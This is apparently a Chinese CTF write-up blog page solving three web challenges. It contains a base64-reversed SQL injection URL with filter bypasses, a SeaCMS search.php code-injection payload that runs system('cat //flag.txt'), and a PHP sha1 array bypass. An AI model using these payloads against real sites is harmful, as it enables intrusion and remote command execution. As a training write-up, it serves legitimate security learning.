-<h3 id="冈村宁次"><a href="#冈村宁次" class="headerlink" title="冈村宁次"></a>冈村宁次</h3><p>看url想了好久才发现是base64逆序，来回转化很麻烦，便写了个脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#coding: utf-8</span><br><span class="line">import base64</span><br><span class="line">s = &quot;&quot; //你要测试的内容 </span><br><span class="line">s1 = base64.b64encode(s)</span><br><span class="line">print s1[::-1]</span><br></pre></td></tr></table></figure></p>
-<p>经过测试，select 空格都被过滤了，不过可以双写，* *\绕过</p>
-<p>最终的payload为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.103.43.235:83/web/a/index.php?id=jcWYsZ2LqoyLt9mcm9iKq8SKnFGbmhCdhNmbvN2XwV3bydGL1wCNsMDLywSMvoiKvQ3YgUGblN3LqoyLu9Wag4WdvoiKvETL</span><br></pre></td></tr></table></figure></p>
-<p>flag{s9li_1s_s0_e4sY}</p>
-<h3 id="作战计划"><a href="#作战计划" class="headerlink" title="作战计划"></a>作战计划</h3><p>是个seacms<br>找到一个getshell文章</p>
-<p><a href="https://balis0ng.com/post/dai-ma-shen-ji/2016-11-02" target="_blank" rel="noopener">https://balis0ng.com/post/dai-ma-shen-ji/2016-11-02</a></p>
-<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.103.43.235:84/search.php?searchtype=5&amp;tid=0&amp;year=23334444);assert($_POST[1]);//</span><br></pre></td></tr></table></figure></p>
-<p>post:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=system(&apos;cat //flag.txt&apos;)</span><br></pre></td></tr></table></figure></p>
-<p>flag{!!seacms_@@} </p>
-<h3 id="池步洲"><a href="#池步洲" class="headerlink" title="池步洲"></a>池步洲</h3><p>查看源代码发现index.phps，下载下来审计<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag = &apos;********&apos;;</span><br><span class="line">if (isset($_POST[&apos;name&apos;]) and isset($_POST[&apos;password&apos;]))&#123;</span><br><span class="line">	if ($_POST[&apos;name&apos;] == $_POST[&apos;password&apos;])</span><br><span class="line">		print &apos;name and password must be diffirent&apos;;</span><br><span class="line">	else if (sha1($_POST[&apos;name&apos;]) === sha1($_POST[&apos;password&apos;]))</span><br><span class="line">		die($flag);</span><br><span class="line">	else print &apos;invalid password&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>火狐hackbar构造post:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name[]=1111&amp;password[]=2222</span><br></pre></td></tr></table></figure></p>
-<p>flag{Y0u_just_br0ke_sha1}</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/03/30/风筝writewp/">展开全文 >></a>
         </p>
       
 
